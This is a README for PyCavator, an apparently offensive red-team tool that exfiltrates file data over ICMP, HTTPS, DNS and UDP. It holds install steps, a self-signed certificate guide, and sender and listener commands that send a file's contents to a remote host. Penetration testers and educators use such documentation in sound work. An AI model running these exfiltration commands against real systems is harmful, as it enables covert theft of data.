# PyCavator

PyCavator is a Python-based tool that can be used to send and receive data using ICMP/HTTPS packets. 
The tool can be used for authorized red teaming and penetration testing activities or educational purposes. 
It provides a sender mode to exfiltrate data from a file and a listener mode to receive incoming data and save it in chunks or to a single file. 
The tool also includes a merge mode to merge output files with part numbers in the specified range. 
With PyCavator, users can easily exfiltrate or receive data using ICMP/HTTPS packets in a secure and efficient manner.

- [PyCavator](#pycavator)
  * [Installation](#installation)
  * [Usage](#usage)
    + [ICMP](#icmp)
    + [HTTPS](#https)
	+ [DNS](#dns)
	+ [UDP](#udp)
  * [How to Contribute](#how-to-contribute)
  * [Disclaimer](#disclaimer)
  * [License](#license)

## Installation

PyCavator requires Python 3 to be installed. To install PyCavator, clone the repository and install the required Python modules:

```bash
git clone https://github.com/kryptohaker/PyCavator.git
cd PyCavator
pip install -r requirements.txt
```

## Usage

### ICMP 

<b>Required libraries:</b><br/>
- All libraries are part of the default Python installation.<br/>

#### Examples:
  <b>Sender mode: exfiltrate data from a file</b><br/>
```bash  
python pycavator-icmp.py -f input.txt -d 192.168.1.101
```  
  <b>Listener mode: listen for incoming data and save in chunks</b><br/>
```bash
python pycavator-icmp.py -l -s 192.168.1.100 -w c
```  
  <b>Listener mode: listen for incoming data and save to a single file</b><br/>
```bash  
python pycavator-icmp.py -l -s 192.168.1.100 -w s -o output_folder
```  
  <b>Merge mode: merge output files with part numbers in the specified range</b><br/>
```bash
python pycavator-icmp.py --merge -x output -a 1 -b 10 -e txt -o output_folder
```

### HTTPS 

<b>Required libraries:</b><br/>
- `requests`: used for sending HTTP requests<br/>
- `Flask`: used for creating the web server<br/>
- `ssl`: used for configuring SSL/TLS encryption<br/>
- `urllib3`: used for disabling SSL warnings<br/>

#### Examples:
  <b>Sender mode: exfiltrate data from a file</b><br/>
```bash
python pycavator-https.py -f input.txt -d 192.168.1.101 -p 4443 -ca ca.pem -t "eyJhbGciO..._adQssw5c"
```
> If in the target machine installation of required libraries is not possible, use `pycavator-httpsender.py` instead.

  <b>Listener mode: listen for incoming data and save to a single file</b><br/>
```bash
python pycavator-https.py -l -s 192.168.1.100 -p 4443 -pb cert.pem -pk key.pem -o /tmp -t "eyJhbGciO..._adQssw5c"
``` 

#### Generating a Key, CSR, and Certificate with OpenSSL

This guide explains how to use OpenSSL to generate a new private key, create a certificate signing request (CSR) with the private key, sign the CSR to create a digital certificate, and display the contents of the certificate.

<b>Prerequisites:</b><br/>
- OpenSSL installed on your system.

##### Steps

Generate a new private key:
```bash
openssl genrsa -out key.pem 2048
```
This command generates a new RSA private key with a length of 2048 bits, and saves it to a file named `key.pem`.

Create a CSR with the private key:
```bash
openssl req -new -key key.pem -out csr.pem
```
This command creates a new certificate signing request (CSR) using the private key stored in the `key.pem` file, and saves the CSR to a file named `csr.pem`.

Sign the CSR to create a digital certificate:
```bash
openssl x509 -req -days 1 -in csr.pem -signkey key.pem -out cert.pem
```
This command uses the private key stored in the `key.pem` file to sign the CSR stored in the `csr.pem` file, and saves the resulting digital certificate to a file named `cert.pem` (is the output file that contains the public key). The `-days 1` option sets the validity period of the certificate to one day.

Display the contents of the certificate:
```bash
openssl x509 -text -noout -in cert.pem
```
This command displays the textual representation of the digital certificate stored in the `cert.pem` file, without the header or footer information.

Create a self-signed root certificate authority:
```bash
cp cert.pem ca.pem
```
This command copies the contents of the `cert.pem` file to a new file named `ca.pem`. This is often done to create a self-signed root certificate authority (CA), which can be used to sign other certificates for internal use.

### DNS
<b>Required libraries:</b><br/>
- dns.query<br/>
- dns.message<br/>
- dns.resolver<br/>

<b>Examples</b><br/>:
Sender mode: exfiltrate data from a file:
```bash
  python pycavator-dns.py -f input.txt -s 192.168.1.101 -p 53 -d example.com -i 1 
```  
Listener mode: listen for incoming data and save to a single file:
```bash
  python pycavator-dns.py -l -s 192.168.1.101 -p 53 -o /tmp
```  
>Note: Once file has been sent, use CTRL+C in listener mode to exit and save. 

### UDP

<b>Examples::</b><br/>
Sender mode: exfiltrate data from a file:
```bash
python pycavator-udp.py -f input.txt -s 192.168.1.101 -p 53 -i 1 
```  
Listener mode: listen for incoming data and save to a single file:
```bash
python pycavator-udp.py -l -s 192.168.1.101 -p 53 -o /tmp
```

## How to Contribute

If you would like to contribute to PyCavator, please fork the repository and submit a pull request.

## Disclaimer

This tool is intended for authorized/legitimate red teaming and pentesting activities or educational purposes only. The author of the tool is not responsible for any misuse or illegal activities that may arise from the use of this tool. Users are responsible for complying with all applicable laws and regulations. By using this tool, you acknowledge that you have read this disclaimer and agree to its terms.

## License

This project is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License. This means that you are free to share and distribute the original work with proper attribution to the original author, but you may not use it for commercial purposes. Additionally, any new versions of the work must be distributed under the same license and with proper attribution to the original author. See the [LICENSE](LICENSE) file for details.




